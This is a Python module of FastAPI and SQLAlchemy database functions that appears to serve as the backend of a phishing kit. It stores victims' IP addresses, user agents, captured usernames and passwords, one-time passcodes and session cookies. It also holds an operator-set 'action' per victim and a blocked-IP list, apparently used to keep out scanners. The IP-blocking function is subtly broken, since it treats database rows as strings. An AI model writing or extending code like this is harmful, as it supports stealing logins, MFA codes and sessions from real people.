from sqlalchemy.orm import Session
from fastapi import HTTPException
import models, schemas
import ipaddress

# Ref: https://fastapi.tiangolo.com/tutorial/sql-databases/


# once website is visited.
def create_user(db: Session, user: schemas.Client):
    db_user = models.User(id=user.id, ip=user.ip, user_agent=user.user_agent)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user


def add_creds(db: Session, id: int, username: str, password: str):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    db_user.username = username
    db_user.password = password
    db.add(db_user)
    db.commit()
    # db.refresh(db_user)
    return db_user


def get_action(db: Session, id: int):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    return db_user.action


def get_OTP(db: Session, id: int):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    return db_user.OTP


def set_OTP(db: Session, id: int, OTP: str):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    db_user.OTP = OTP
    db.add(db_user)
    db.commit()
    # db.refresh(db_user)
    return db_user


def set_Cookie(db: Session, id: int, Cookie: str):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    db_user.Cookies = Cookie
    db.add(db_user)
    db.commit()
    # db.refresh(db_user)
    return db_user


def check_IfIPBlocked(db: Session, ip: str):
    db_blcokedIP = db.query(models.Blocked_IP)
    for row in db_blcokedIP.all():
        # check if CIDR or normal IP
        if "/" in row:
            if ipaddress.IPv4Address(ip) in ipaddress.IPv4Network(row):
                return True
        else:
            if row == ip:
                return True
    return False


def set_blockIP(db: Session, ip: str):
    db_blcokedIP = models.Blocked_IP(ip=ip)
    db.add(db_blcokedIP)
    db.commit()
    db.refresh(db_blcokedIP)


def get_Cookie(db: Session, id: int):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    return db_user.Cookies


def set_action(db: Session, id: int, action: str):
    db_user = db.query(models.User).filter(models.User.id == id).first()
    if not db_user:
        return None
    db_user.action = action
    db.add(db_user)
    db.commit()
    # db.refresh(db_user)
    return db_user


def get_users(db: Session, skip: int = 0):
    return db.query(models.User).where(models.User.username != "").all()


def get_user(db: Session, user_id: int):
    return db.query(models.User).filter(models.User.id == user_id).first()
